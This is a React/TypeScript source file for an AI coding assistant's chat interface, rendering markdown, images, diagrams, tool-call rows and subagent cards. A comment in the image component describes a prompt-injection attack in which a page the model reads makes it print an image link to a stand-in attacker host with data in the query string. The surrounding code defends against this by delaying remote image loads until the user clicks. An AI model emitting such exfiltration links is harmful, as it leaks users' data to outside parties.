import { Fragment, memo, useEffect, useId, useMemo, useRef, useState, type ReactNode } from "react";
import { api, jobsApi, learnApi, type LearnedItem } from "../lib/api";
import {
  AlertTriangle,
  BookOpen,
  Bot,
  Brain,
  Check,
  ChevronRight,
  Copy,
  ExternalLink,
  FilePen,
  FileText,
  GitBranch,
  Globe,
  ImageOff,
  Info,
  ListTodo,
  MessageCircleQuestionMark,
  Pencil,
  Search,
  Sparkles,
  Terminal,
  Undo2,
  Wrench,
  X,
  type LucideIcon,
} from "lucide-react";
import type { Block, ToolRow } from "../lib/turn";
import { ZerithMark } from "./ui";
import { FileLangBadge } from "./FileLangIcon";
import { TurnChanges } from "./Changes";
export { FileLangBadge };
import { highlightCode } from "./highlight";
import {
  parseBlocks,
  parseBlocksCached,
  splitStableMarkdown,
  type Inline,
  type MdBlock,
} from "./markdown";

function formatLearnedItemText(item: LearnedItem): string {
  if (item.kind === "skill" && item.name) {
    return item.text ? `${item.name}: ${item.text}` : item.name;
  }
  return item.text;
}

/** `/btw`: a pergunta paralela e a resposta, num cartão recolhível que não é
 * mensagem da conversa (nunca volta ao modelo). Aberto quando a resposta chega. */
function BtwNote(props: { btw: NonNullable<Extract<Block, { kind: "note" }>["btw"]> }) {
  const { question, answer, error, model } = props.btw;
  const [open, setOpen] = useState(true);
  const pending = answer == null && error == null;
  return (
    <div className={"learned-card btw-card" + (open ? " open" : "")}>
      <div className="learned-head">
        <button
          type="button"
          className="learned-toggle"
          aria-expanded={open}
          onClick={() => setOpen((v) => !v)}
        >
          <MessageCircleQuestionMark size={13} strokeWidth={2} className="learned-icon" aria-hidden />
          <span className="learned-title">Pergunta paralela</span>
          <span className="learned-preview" title={question}>
            {question}
          </span>
        </button>
        <span className="learned-chev" aria-hidden="true" onClick={() => setOpen((v) => !v)}>
          <ChevronRight size={14} strokeWidth={2} className="chev" />
        </span>
      </div>
      {open ? (
        <div className="learned-body btw-body">
          {pending ? (
            <span className="btw-pending">pensando…</span>
          ) : error != null ? (
            <span className="btw-error">Não consegui responder: {error}</span>
          ) : (
            <Markdown text={answer ?? ""} streaming={false} />
          )}
          {model ? <span className="btw-meta">{model} · fora da conversa</span> : null}
        </div>
      ) : null}
    </div>
  );
}

/** Antigravity-style collapsible card for what the background review saved after a turn. */
function LearnedNote(props: { text: string; items: LearnedItem[] }) {
  const [open, setOpen] = useState(false);
  const [undoneIdx, setUndoneIdx] = useState<Set<number>>(() => new Set());
  const [busyAll, setBusyAll] = useState(false);
  const [busyIdx, setBusyIdx] = useState<Set<number>>(() => new Set());
  const [error, setError] = useState<string | null>(null);

  const total = props.items.length;
  const allUndone = total > 0 && undoneIdx.size >= total;
  const anyBusy = busyAll || busyIdx.size > 0;

  const title = allUndone
    ? "Aprendizado desfeito"
    : total === 1
      ? props.items[0].kind === "skill"
        ? "Skill salva"
        : "Memória salva"
      : `${total} aprendizados salvos`;

  const preview =
    props.items
      .map(formatLearnedItemText)
      .filter(Boolean)
      .join(" · ") || props.text.replace(/^Aprendi:\s*/, "");

  const undoOne = async (idx: number) => {
    if (undoneIdx.has(idx) || anyBusy) return;
    setError(null);
    setBusyIdx((prev) => new Set(prev).add(idx));
    try {
      await learnApi.undo(props.items[idx]);
      setUndoneIdx((prev) => new Set(prev).add(idx));
    } catch (e) {
      setError(e instanceof Error ? e.message : String(e));
    } finally {
      setBusyIdx((prev) => {
        const next = new Set(prev);
        next.delete(idx);
        return next;
      });
    }
  };

  const undoAll = async () => {
    if (allUndone || anyBusy) return;
    const remaining = props.items
      .map((_, idx) => idx)
      .filter((idx) => !undoneIdx.has(idx));
    if (!remaining.length) return;
    setError(null);
    setBusyAll(true);
    const succeeded: number[] = [];
    let firstErr: unknown = null;
    try {
      for (const idx of remaining) {
        try {
          await learnApi.undo(props.items[idx]);
          succeeded.push(idx);
        } catch (err) {
          if (firstErr == null) firstErr = err;
        }
      }
      if (succeeded.length > 0) {
        setUndoneIdx((prev) => {
          const next = new Set(prev);
          for (const idx of succeeded) next.add(idx);
          return next;
        });
      }
      if (firstErr != null) {
        setError(firstErr instanceof Error ? firstErr.message : String(firstErr));
      }
    } finally {
      setBusyAll(false);
    }
  };

  return (
    <div className={"learned-card" + (open ? " open" : "") + (allUndone ? " undone" : "")}>
      <div className="learned-head">
        <button
          type="button"
          className="learned-toggle"
          aria-expanded={open}
          onClick={() => setOpen((v) => !v)}
        >
          <Sparkles size={13} strokeWidth={2} className="learned-icon" aria-hidden />
          <span className="learned-title">{title}</span>
          {preview ? (
            <span className="learned-preview" title={preview}>
              {preview}
            </span>
          ) : null}
        </button>
        {!allUndone ? (
          <button
            type="button"
            className="learned-undo"
            onClick={(e) => {
              e.stopPropagation();
              void undoAll();
            }}
            disabled={anyBusy}
            title={error ?? "Apagar o que foi aprendido neste turno"}
          >
            <Undo2 size={12} strokeWidth={2} aria-hidden />
            <span>Desfazer</span>
          </button>
        ) : null}
        <span
          className="learned-chev"
          aria-hidden="true"
          onClick={() => setOpen((v) => !v)}
        >
          <ChevronRight size={14} strokeWidth={2} className="chev" />
        </span>
      </div>
      {open ? (
        <div className="learned-body">
          {props.items.map((item, idx) => {
            const isUndone = undoneIdx.has(idx);
            const isBusy = busyAll || busyIdx.has(idx);
            const kindLabel = item.kind === "skill" ? "Skill" : "Memória";
            const opLabel =
              item.op === "update" || item.op === "patch" ? ` · ${item.op}` : "";
            const itemText = formatLearnedItemText(item);
            return (
              <div key={idx} className={"learned-item" + (isUndone ? " undone" : "")}>
                <span className="learned-badge">
                  {kindLabel}
                  {opLabel}
                </span>
                <span className={"learned-item-text" + (isUndone ? " undone" : "")}>
                  {itemText}
                </span>
                {isUndone ? (
                  <span className="learned-item-done">Desfeito</span>
                ) : (
                  <button
                    type="button"
                    className="learned-undo"
                    onClick={() => void undoOne(idx)}
                    disabled={isBusy}
                    title="Desfazer este item"
                  >
                    <Undo2 size={12} strokeWidth={2} aria-hidden />
                    <span>Desfazer</span>
                  </button>
                )}
              </div>
            );
          })}
        </div>
      ) : null}
      {error ? (
        <p className="learned-error" role="alert">
          {error}
        </p>
      ) : null}
    </div>
  );
}

const SUBAGENT_STATE_LABEL: Record<string, string> = {
  running: "Executando",
  done: "Concluído",
  failed: "Falhou",
  cancelled: "Cancelado",
};

function shortSubagentModel(raw: string): string {
  const idx = raw.indexOf(":");
  return idx > 0 ? raw.slice(idx + 1) : raw;
}

function splitSubagentName(raw: string): { role: string; title: string } {
  const colon = raw.indexOf(":");
  if (colon <= 0) return { role: "agente", title: raw.trim() };
  return {
    role: raw.slice(0, colon).trim(),
    title: raw.slice(colon + 1).trim(),
  };
}

function SubagentCard({ block }: { block: Extract<Block, { kind: "subagent" }> }) {
  const [open, setOpen] = useState(false);
  const [stopping, setStopping] = useState(false);
  const { role, title } = splitSubagentName(block.name);
  const st =
    block.state === "running" ||
    block.state === "done" ||
    block.state === "failed" ||
    block.state === "cancelled"
      ? block.state
      : "done";
  const hasDetails = block.steps.length > 0 || Boolean(block.summary);
  const modelLabel = block.model ? shortSubagentModel(block.model) : "";
  const statusLabel = SUBAGENT_STATE_LABEL[block.state] ?? block.state;

  return (
    <div className={`subagent-card ${st}` + (open ? " open" : "")}>
      <div className="subagent-row">
        <button
          type="button"
          className="subagent-head"
          disabled={!hasDetails}
          aria-expanded={hasDetails ? open : undefined}
          onClick={() => hasDetails && setOpen((v) => !v)}
        >
          <span className={`subagent-icon ${st}`} aria-hidden>
            {st === "running" ? (
              <span className="spinner" />
            ) : st === "done" ? (
              <Check size={14} strokeWidth={2.25} />
            ) : st === "failed" ? (
              <AlertTriangle size={14} strokeWidth={2} />
            ) : (
              <X size={14} strokeWidth={2.25} />
            )}
          </span>
          <span className="subagent-role">{role}</span>
          <span className="subagent-title" title={title}>
            {title}
          </span>
          {modelLabel ? (
            <span className="subagent-model" title={block.model}>
              {modelLabel}
            </span>
          ) : null}
          <span className={`subagent-status ${st}`}>{statusLabel}</span>
          {hasDetails ? (
            <ChevronRight size={14} strokeWidth={2} className="chev" />
          ) : null}
        </button>
        {st === "running" ? (
          <button
            type="button"
            className="subagent-stop"
            disabled={stopping}
            title="Parar este subagente; o que ele já fez volta para a conversa"
            onClick={() => {
              setStopping(true);
              void jobsApi.stopSubagent(block.id).catch(() => setStopping(false));
            }}
          >
            {stopping ? "Parando..." : "Parar"}
          </button>
        ) : null}
      </div>
      {st === "running" && block.summary && !open ? (
        <div className="subagent-live">{block.summary}</div>
      ) : null}
      {open && hasDetails ? (
        <div className="subagent-body">
          {block.steps.length > 0 ? (
            <>
              <ul className="subagent-steps">
                {block.steps.map((s, idx) => (
                  <li key={idx}>{s}</li>
                ))}
              </ul>
              {block.summary &&
              block.summary.trim() !==
                block.steps[block.steps.length - 1]?.trim() ? (
                <p className="subagent-summary">{block.summary}</p>
              ) : null}
            </>
          ) : (
            <p className="subagent-summary">{block.summary}</p>
          )}
        </div>
      ) : null}
    </div>
  );
}

const isWeb = (src: string) => /^(https?:|data:)/i.test(src);
const USER_IMG = /^!\[([^\]\n]*)\]\(<([^>\n]+)>\)\s*$/gm;

/** Full-window view of one image; Esc or a click outside closes it. */
function Lightbox({ src, url, alt, onClose }: { src: string; url: string; alt: string; onClose: () => void }) {
  const root = useRef<HTMLDivElement>(null);
  const closeBtn = useRef<HTMLButtonElement>(null);
  useEffect(() => {
    const back = document.activeElement as HTMLElement | null;
    closeBtn.current?.focus();
    return () => back?.focus?.();
  }, []);
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") return onClose();
      if (e.key !== "Tab" || !root.current) return;
      // Keep Tab inside the dialog.
      const items = [...root.current.querySelectorAll<HTMLElement>("button")];
      if (!items.length) return;
      const first = items[0];
      const last = items[items.length - 1];
      const at = document.activeElement;
      if (e.shiftKey && (at === first || !root.current.contains(at))) {
        e.preventDefault();
        last.focus();
      } else if (!e.shiftKey && (at === last || !root.current.contains(at))) {
        e.preventDefault();
        first.focus();
      }
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);
  const isHttp = /^https?:/i.test(src);
  const canOpenExternally = isHttp || !isWeb(src);
  const open = () => (isHttp ? void api.openUrl(src) : void api.openImage(src));
  return (
    <div ref={root} className="lightbox" role="dialog" aria-modal="true" aria-label={alt || "Imagem"} onClick={onClose}>
      <img src={url} alt={alt} onClick={(e) => e.stopPropagation()} />
      <div className="lightbox-bar" onClick={(e) => e.stopPropagation()}>
        <span className="lightbox-name">{alt || (src.startsWith("data:") ? "Imagem" : src.split(/[\\/]/).pop())}</span>
        {canOpenExternally ? (
          <button className="btn btn-sm" onClick={open}>
            <ExternalLink size={14} strokeWidth={2} />
            Abrir fora
          </button>
        ) : null}
        <button ref={closeBtn} className="icon-btn sm" onClick={onClose} aria-label="Fechar" title="Fechar (Esc)">
          <X size={16} strokeWidth={2} />
        </button>
      </div>
    </div>
  );
}

/** `![alt](src)`: web and data URLs load directly; a local path is read
 * through the core, which only hands back image files. */
function MdImage({ src, alt }: { src: string; alt: string }) {
  // A page the model read can make it print `![](https://attacker/x?d=...)`:
  // loading that by itself is a zero-click ping (or a leak in the query). A
  // remote image therefore waits for the click; local files and data: URLs
  // load as before. UNC / protocol-relative paths are always rejected.
  const blockedUnc = src.startsWith("//") || src.startsWith("\\\\") || src.startsWith("/\\");
  const remote = /^https?:/i.test(src);
  const [allowed, setAllowed] = useState(!remote);
  const [url, setUrl] = useState<string | null>(isWeb(src) && !remote ? src : null);
  const [failed, setFailed] = useState<string | null>(blockedUnc ? "caminho UNC recusado" : null);
  const [zoom, setZoom] = useState(false);
  useEffect(() => {
    setAllowed(!remote);
    setUrl(isWeb(src) && !remote ? src : null);
    setFailed(blockedUnc ? "caminho UNC recusado" : null);
    setZoom(false);
  }, [src, remote, blockedUnc]);
  useEffect(() => {
    if (blockedUnc) return;
    if (remote) {
      if (!allowed) return;
      setUrl(src);
      return;
    }
    if (isWeb(src)) return;
    let live = true;
    api
      .readImage(src)
      .then((u) => live && setUrl(u))
      .catch((e) => live && setFailed(String(e)));
    return () => {
      live = false;
    };
  }, [src, remote, allowed, blockedUnc]);
  if (failed) {
    return (
      <span className="md-img-fail" title={failed}>
        <ImageOff size={14} strokeWidth={2} />
        {alt || src}
      </span>
    );
  }
  if (!allowed) {
    let host = src;
    try {
      host = new URL(src).host;
    } catch {
      /* keep the raw text */
    }
    return (
      <button
        type="button"
        className="md-img-pending"
        onClick={() => setAllowed(true)}
        title={src}
      >
        <ImageOff size={14} strokeWidth={2} aria-hidden />
        <span>Imagem de {host}</span>
        <span className="md-img-load">Carregar</span>
      </button>
    );
  }
  if (!url) return <span className="md-img loading" aria-label="Carregando imagem" />;
  if (url.startsWith("data:video/") || /\.(mp4|m4v|webm|mov)$/i.test(src)) {
    return <video className="md-video" src={url} controls preload="metadata" aria-label={alt || "Vídeo"} />;
  }
  return (
    <>
      <button className="md-img" onClick={() => setZoom(true)} title={alt || "Ampliar"}>
        <img src={url} alt={alt} loading="lazy" onError={() => setFailed("não carregou")} />
      </button>
      {zoom ? <Lightbox src={src} url={url} alt={alt} onClose={() => setZoom(false)} /> : null}
    </>
  );
}

// First match wins, so web_search is a Globe before "search" makes it a lens.
const TOOL_ICONS: [RegExp, LucideIcon][] = [
  [/^skill/, BookOpen],
  [/todo/, ListTodo],
  [/web|fetch|http|url|browse/, Globe],
  [/bash|shell|exec|command|terminal|powershell/, Terminal],
  [/grep|glob|search|find/, Search],
  [/write|edit|patch|replace|create/, FilePen],
  [/read|view|cat/, FileText],
  [/agent|task|delegate/, Bot],
];

/** The icon a tool row (and the approval card) shows for a tool name. */
export function toolIcon(name: string): LucideIcon {
  const n = name.toLowerCase();
  return TOOL_ICONS.find(([re]) => re.test(n))?.[1] ?? Wrench;
}

const ARG_KEYS = ["path", "file_path", "filePath", "pattern", "command", "cmd", "url", "query", "glob", "description", "prompt", "name"];

function parseArgs(args: string): unknown {
  try {
    return JSON.parse(args);
  } catch {
    return null;
  }
}

/** The one argument worth reading in a collapsed row: the path, the command… */
function argSummary(args: string): string {
  const v = parseArgs(args) as Record<string, unknown> | null;
  if (v && typeof v === "object") {
    const key = ARG_KEYS.find((k) => typeof v[k] === "string");
    const first = key ? v[key] : Object.values(v).find((x) => typeof x === "string");
    return typeof first === "string" ? first.replace(/\s+/g, " ") : "";
  }
  return args.replace(/\s+/g, " ");
}

function CopyButton({ text, label }: { text: string; label?: string }) {
  const [done, setDone] = useState(false);
  const copy = () =>
    void navigator.clipboard
      ?.writeText(text)
      .then(() => {
        setDone(true);
        setTimeout(() => setDone(false), 1400);
      })
      .catch(() => undefined);
  const name = done ? "Copiado" : (label ?? "Copiar");
  return (
    <button className={"copy-btn" + (done ? " done" : "")} onClick={copy} aria-label={name} title={name}>
      {done ? <Check size={14} strokeWidth={2} /> : <Copy size={14} strokeWidth={2} />}
      {label ? <span>{name}</span> : null}
    </button>
  );
}

function inlines(nodes: Inline[]): ReactNode[] {
  return nodes.map((n, i) => {
    if (typeof n === "string") {
      if (!n.includes("\n")) return n;
      return <Fragment key={i}>{n.split("\n").map((s, j) => (j ? [<br key={j} />, s] : s))}</Fragment>;
    }
    if (n.t === "code") return <code key={i}>{n.v}</code>;
    if (n.t === "img") return <MdImage key={i} src={n.src} alt={n.alt} />;
    if (n.t === "a") {
      return (
        <a key={i} href={n.href} target="_blank" rel="noreferrer noopener">
          {inlines(n.c)}
        </a>
      );
    }
    const Tag = n.t === "b" ? "strong" : n.t === "i" ? "em" : "s";
    return <Tag key={i}>{inlines(n.c)}</Tag>;
  });
}

const HighlightedCode = memo(function HighlightedCode({
  lang,
  text,
}: {
  lang: string;
  text: string;
}) {
  const tokens = useMemo(() => highlightCode(lang, text), [lang, text]);
  return (
    <>
      {tokens.map((t, idx) =>
        t.cls ? (
          <span key={idx} className={t.cls}>
            {t.text}
          </span>
        ) : (
          <Fragment key={idx}>{t.text}</Fragment>
        ),
      )}
    </>
  );
});

type GraphNode = { id: string; label: string; layer: number; row: number };
type GraphEdge = { from: string; to: string; label: string };

function parseMermaidGraph(src: string): { nodes: GraphNode[]; edges: GraphEdge[] } | null {
  const nodesMap = new Map<string, string>();
  const edges: GraphEdge[] = [];
  const cleanLabel = (raw: string) =>
    raw
      .trim()
      .replace(/^["'[(]+|["'\])]+$/g, "")
      .replace(/\\n/g, " · ");

  const parseEndpoint = (token: string): string => {
    const t = token.trim();
    const m = /^([A-Za-z0-9_.-]+)\s*(?:\[([^\]]+)\]|"([^"]+)"|\(([^)]+)\)|\{([^}]+)\})?/.exec(t);
    if (!m) return t;
    const id = m[1];
    const lbl = m[2] || m[3] || m[4] || m[5];
    if (lbl && !nodesMap.has(id)) {
      nodesMap.set(id, cleanLabel(lbl));
    } else if (!nodesMap.has(id)) {
      nodesMap.set(id, id);
    }
    return id;
  };

  for (const rawLine of src.split("\n")) {
    const line = rawLine.trim();
    if (
      !line ||
      line.startsWith("%%") ||
      /^(graph|flowchart|subgraph|end|style|classDef|class|direction)\b/i.test(line)
    ) {
      continue;
    }
    const edgeMatch =
      /^(.+?)\s*(?:-->|---|==>|-\.->)\s*(?:\|([^|]+)\|\s*)?(.+)$/.exec(line) ||
      /^(.+?)\s*--\s*([^-|>]+?)\s*-->\s*(.+)$/.exec(line);
    if (edgeMatch) {
      const from = parseEndpoint(edgeMatch[1]);
      const edgeLabel = (edgeMatch[2] ?? "").trim();
      const to = parseEndpoint(edgeMatch[3]);
      if (from && to) {
        edges.push({ from, to, label: edgeLabel });
      }
    }
  }

  if (nodesMap.size < 2 || edges.length === 0) return null;

  const inDegree = new Map<string, number>();
  const adj = new Map<string, string[]>();
  for (const id of nodesMap.keys()) {
    inDegree.set(id, 0);
    adj.set(id, []);
  }
  for (const e of edges) {
    inDegree.set(e.to, (inDegree.get(e.to) ?? 0) + 1);
    adj.get(e.from)?.push(e.to);
  }

  const layerMap = new Map<string, number>();
  const queue: string[] = [];
  for (const [id, deg] of inDegree.entries()) {
    if (deg === 0) {
      layerMap.set(id, 0);
      queue.push(id);
    }
  }
  if (queue.length === 0) {
    const first = nodesMap.keys().next().value;
    if (first) {
      layerMap.set(first, 0);
      queue.push(first);
    }
  }
  while (queue.length > 0) {
    const cur = queue.shift()!;
    const curLayer = layerMap.get(cur) ?? 0;
    for (const nxt of adj.get(cur) ?? []) {
      if (!layerMap.has(nxt)) {
        layerMap.set(nxt, Math.min(curLayer + 1, 8));
        queue.push(nxt);
      }
    }
  }
  for (const id of nodesMap.keys()) {
    if (!layerMap.has(id)) layerMap.set(id, 0);
  }

  const byLayer = new Map<number, string[]>();
  for (const [id, l] of layerMap.entries()) {
    const arr = byLayer.get(l) ?? [];
    arr.push(id);
    byLayer.set(l, arr);
  }

  const nodes: GraphNode[] = [];
  for (const [layer, ids] of byLayer.entries()) {
    ids.forEach((id, row) => {
      nodes.push({
        id,
        label: nodesMap.get(id) ?? id,
        layer,
        row,
      });
    });
  }
  return { nodes, edges };
}

function MermaidDiagramBlock({ lang, text }: { lang: string; text: string }) {
  const markerId = `mermaid-arrow-${useId().replace(/[^a-zA-Z0-9_-]/g, "")}`;
  const graph = useMemo(() => parseMermaidGraph(text), [text]);
  const [userView, setUserView] = useState<"diagram" | "code" | null>(null);
  const view = userView ?? (graph ? "diagram" : "code");

  if (!graph) {
    return (
      <div className="md-code">
        <div className="md-code-bar">
          <span>{lang || "mermaid"}</span>
          <CopyButton text={text} label="Copiar" />
        </div>
        <pre>
          <code>
            <HighlightedCode lang={lang} text={text} />
          </code>
        </pre>
      </div>
    );
  }

  const maxLayer = Math.max(...graph.nodes.map((n) => n.layer), 0);
  const maxRow = Math.max(...graph.nodes.map((n) => n.row), 0);
  const colW = 210;
  const rowH = 74;
  const nodeW = 164;
  const nodeH = 42;
  const padX = 28;
  const padY = 24;
  const width = Math.max(420, (maxLayer + 1) * colW + padX * 2);
  const height = Math.max(130, (maxRow + 1) * rowH + padY * 2);
  const pos = new Map<string, { x: number; y: number }>();
  for (const n of graph.nodes) {
    pos.set(n.id, {
      x: padX + n.layer * colW,
      y: padY + n.row * rowH,
    });
  }

  return (
    <div className="md-code">
      <div className="md-code-bar">
        <span>{lang} · topologia</span>
        <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
          <button
            type="button"
            className="copy-btn"
            onClick={() => setUserView(view === "diagram" ? "code" : "diagram")}
          >
            <span>{view === "diagram" ? "Ver código" : "Ver diagrama"}</span>
          </button>
          <CopyButton text={text} label="Copiar" />
        </div>
      </div>
      {view === "diagram" ? (
        <div style={{ overflowX: "auto", padding: "12px 8px" }}>
          <svg
            width={width}
            height={height}
            viewBox={`0 0 ${width} ${height}`}
            role="img"
            aria-label="Diagrama de topologia Mermaid"
          >
            <defs>
              <marker
                id={markerId}
                viewBox="0 0 10 10"
                refX="9"
                refY="5"
                markerWidth="6"
                markerHeight="6"
                orient="auto-start-reverse"
              >
                <path d="M 0 1 L 10 5 L 0 9 z" fill="currentColor" opacity="0.65" />
              </marker>
            </defs>
            {graph.edges.map((e, idx) => {
              const p1 = pos.get(e.from);
              const p2 = pos.get(e.to);
              if (!p1 || !p2) return null;
              const x1 = p1.x + nodeW;
              const y1 = p1.y + nodeH / 2;
              const x2 = p2.x;
              const y2 = p2.y + nodeH / 2;
              const mx = (x1 + x2) / 2;
              const my = (y1 + y2) / 2 - 6;
              return (
                <g key={idx}>
                  <line
                    x1={x1}
                    y1={y1}
                    x2={x2}
                    y2={y2}
                    stroke="currentColor"
                    strokeOpacity="0.45"
                    strokeWidth="1.5"
                    markerEnd={`url(#${markerId})`}
                  />
                  {e.label ? (
                    <text
                      x={mx}
                      y={my}
                      textAnchor="middle"
                      fontSize="10"
                      fill="currentColor"
                      opacity="0.8"
                    >
                      {e.label.slice(0, 22)}
                    </text>
                  ) : null}
                </g>
              );
            })}
            {graph.nodes.map((n) => {
              const p = pos.get(n.id)!;
              return (
                <g key={n.id} transform={`translate(${p.x},${p.y})`}>
                  <rect
                    width={nodeW}
                    height={nodeH}
                    rx="8"
                    fill="var(--layer-2)"
                    stroke="currentColor"
                    strokeOpacity="0.35"
                    strokeWidth="1.25"
                  />
                  <text
                    x={nodeW / 2}
                    y={nodeH / 2 + 4}
                    textAnchor="middle"
                    fontSize="11.5"
                    fontWeight="600"
                    fill="currentColor"
                  >
                    {n.label.length > 22 ? n.label.slice(0, 20) + "…" : n.label}
                  </text>
                </g>
              );
            })}
          </svg>
        </div>
      ) : (
        <pre>
          <code>
            <HighlightedCode lang={lang} text={text} />
          </code>
        </pre>
      )}
    </div>
  );
}

function blocks(list: MdBlock[]): ReactNode[] {
  return list.map((b, i) => {
    switch (b.t) {
      case "h": {
        const Tag = `h${Math.min(b.level, 4)}` as "h1" | "h2" | "h3" | "h4";
        return <Tag key={i}>{inlines(b.c)}</Tag>;
      }
      case "p":
        return <p key={i}>{inlines(b.c)}</p>;
      case "list": {
        const items = b.items.map((it, j) => <li key={j}>{blocks(it)}</li>);
        return b.ordered ? (
          <ol key={i} start={b.start}>
            {items}
          </ol>
        ) : (
          <ul key={i}>{items}</ul>
        );
      }
      case "code":
        if (/^(mermaid|topology)$/i.test(b.lang.trim())) {
          return <MermaidDiagramBlock key={i} lang={b.lang} text={b.text} />;
        }
        return (
          <div key={i} className="md-code">
            <div className="md-code-bar">
              <span>{b.lang || "texto"}</span>
              <CopyButton text={b.text} label="Copiar" />
            </div>
            <pre>
              <code>
                <HighlightedCode lang={b.lang} text={b.text} />
              </code>
            </pre>
          </div>
        );
      case "quote":
        return <blockquote key={i}>{blocks(b.c)}</blockquote>;
      case "table":
        return (
          <div key={i} className="md-table">
            <table>
              <thead>
                <tr>
                  {b.head.map((c, k) => (
                    <th key={k} style={{ textAlign: b.align[k] ?? undefined }}>
                      {inlines(c)}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {b.rows.map((r, j) => (
                  <tr key={j}>
                    {r.map((c, k) => (
                      <td key={k} style={{ textAlign: b.align[k] ?? undefined }}>
                        {inlines(c)}
                      </td>
                    ))}
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        );
      case "hr":
        return <hr key={i} />;
    }
  });
}

const StableMarkdown = memo(function StableMarkdown({ text }: { text: string }) {
  const tree = useMemo(() => parseBlocksCached(text), [text]);
  return <>{blocks(tree)}</>;
});

function Markdown({ text, streaming }: { text: string; streaming: boolean }) {
  const { stable, tail } = useMemo(
    () => (streaming ? splitStableMarkdown(text) : { stable: text, tail: "" }),
    [text, streaming],
  );
  const tailTree = useMemo(
    () => (tail ? parseBlocks(tail) : []),
    [tail],
  );
  return (
    <div className={"md" + (streaming ? " streaming" : "")}>
      {stable ? <StableMarkdown text={stable} /> : null}
      {tailTree.length ? blocks(tailTree) : null}
    </div>
  );
}

const STATE_LABEL = { run: "executando", ok: "concluída", fail: "falhou" } as const;

const FILE_TOOLS = new Set([
  "read_file",
  "edit_file",
  "multi_edit",
  "write_file",
  "diagnostics",
  "lsp_definition",
  "lsp_references",
  "lsp_hover",
  "lsp_symbols",
]);

function toolActionLabel(name: string): string {
  switch (name) {
    case "read_file":
    case "diagnostics":
    case "lsp_definition":
    case "lsp_references":
    case "lsp_hover":
    case "lsp_symbols":
      return "Analyzed";
    case "edit_file":
    case "multi_edit":
      return "Edited";
    case "write_file":
      return "Created";
    case "grep":
    case "glob":
    case "repo_map":
    case "web_search":
    case "skill_search":
    case "session_search":
      return "Searched";
    case "list_dir":
      return "Listed";
    case "shell":
      return "Ran";
    case "net_connect":
      return "Connected";
    case "terminal_batch":
    case "net_broadcast":
      return "Executed";
    case "agent":
      return "Delegated";
    case "skill":
    case "skill_load":
      return "Loaded skill";
    case "memory":
    case "memory_save":
    case "memory_update":
    case "memory_forget":
    case "memory_recall":
      return "Memory";
    default:
      return name;
  }
}

function computeFileLineRange(name: string, argsObj: Record<string, unknown> | null, preview?: string): string | null {
  if (name !== "read_file") return null;
  const offset = typeof argsObj?.offset === "number" && argsObj.offset >= 1 ? Math.floor(argsObj.offset) : 1;
  const limit = typeof argsObj?.limit === "number" && argsObj.limit >= 1 ? Math.floor(argsObj.limit) : null;
  if (preview) {
    const m = /\[linhas\s+(\d+)-(\d+)\s+de\s+\d+/i.exec(preview);
    if (m) return `#L${m[1]}-${m[2]}`;
    const nums = [...preview.matchAll(/^(\d+)\t/gm)].map((x) => Number(x[1]));
    if (nums.length > 0) {
      const first = nums[0];
      const last = limit ? Math.max(nums[nums.length - 1], first + limit - 1) : nums[nums.length - 1];
      return `#L${first}-${last}`;
    }
  }
  if (limit) {
    return `#L${offset}-${offset + limit - 1}`;
  }
  return `#L${offset}`;
}

function ToolLine({ row, sessionId }: { row: ToolRow; sessionId?: string | null }) {
  const [open, setOpen] = useState(false);
  const Icon = toolIcon(row.name);
  const parsed = parseArgs(row.args);
  const argsObj = parsed && typeof parsed === "object" ? (parsed as Record<string, unknown>) : null;
  let arg = argSummary(row.args);
  if (row.name === "agent" && argsObj) {
    const role = typeof argsObj.agent === "string" ? argsObj.agent.trim() : "";
    const desc = typeof argsObj.description === "string" ? argsObj.description.trim() : "";
    if (role && desc) arg = `${role}: ${desc}`;
    else if (desc || role) arg = desc || role;
  }
  const body = row.preview ?? row.progress ?? (parsed ? JSON.stringify(parsed, null, 2) : row.args);
  const state = row.ok === undefined ? "run" : row.ok ? "ok" : "fail";
  const liveTail =
    state === "run" && row.progress
      ? row.progress.split(/\r?\n/).slice(-8).join("\n")
      : null;
  const rawPath =
    typeof argsObj?.path === "string"
      ? argsObj.path
      : typeof argsObj?.file_path === "string"
        ? argsObj.file_path
        : typeof argsObj?.filePath === "string"
          ? argsObj.filePath
          : null;
  const isFileTool = FILE_TOOLS.has(row.name) && Boolean(rawPath);
  const fileBase = rawPath ? (rawPath.split(/[\\/]/).pop() ?? rawPath) : "";
  const lineRange = isFileTool ? computeFileLineRange(row.name, argsObj, row.preview) : null;
  const label = toolActionLabel(row.name);
  const firstLine = lineRange ? Number(lineRange.match(/\d+/)?.[0]) || undefined : undefined;
  return (
    <div className={`tool ${state}` + (open ? " open" : "")}>
      <div className="tool-row">
      <button className="tool-head" onClick={() => setOpen(!open)} aria-expanded={open} disabled={!body}>
        {!isFileTool ? (
          <span className="tool-icon">
            <Icon size={14} strokeWidth={2} />
          </span>
        ) : null}
        <span className="tool-name">{label}</span>
        {isFileTool && rawPath ? (
          <span className="tool-file" title={rawPath}>
            <FileLangBadge path={rawPath} />
            <span className="tool-file-name">{fileBase}</span>
            {lineRange ? <span className="tool-range">{lineRange}</span> : null}
          </span>
        ) : (
          <span className="tool-arg" title={arg}>
            {arg}
          </span>
        )}
        {isFileTool ? <span className="spacer" /> : null}
        <span className="tool-state" role="img" aria-label={STATE_LABEL[state]}>
          {state === "run" ? (
            <span className="spinner" />
          ) : state === "ok" ? (
            <Check size={14} strokeWidth={2.25} />
          ) : (
            <X size={14} strokeWidth={2.25} />
          )}
        </span>
        <ChevronRight size={14} strokeWidth={2} className="chev" />
      </button>
      {isFileTool && rawPath ? (
        <button
          className="tool-open"
          title="Abrir no editor (VS Code)"
          aria-label={`Abrir ${fileBase} no editor`}
          onClick={() => void api.openInEditor(rawPath, sessionId, firstLine).catch(() => undefined)}
        >
          <ExternalLink size={13} strokeWidth={2} />
        </button>
      ) : null}
      </div>
      {liveTail && !open ? <pre className="tool-body live">{liveTail}</pre> : null}
      {open && body ? <pre className="tool-body">{body}</pre> : null}
    </div>
  );
}

const AssistantBlock = memo(function AssistantBlock(props: {
  block: Block & { kind: "assistant" };
  sessionId?: string | null;
  onBranch?: (id: number) => void;
  /** Resends the last prompt (only on the newest failed answer). */
  onRetry?: () => void;
}) {
  const [showReasoning, setShowReasoning] = useState(false);
  const b = props.block;
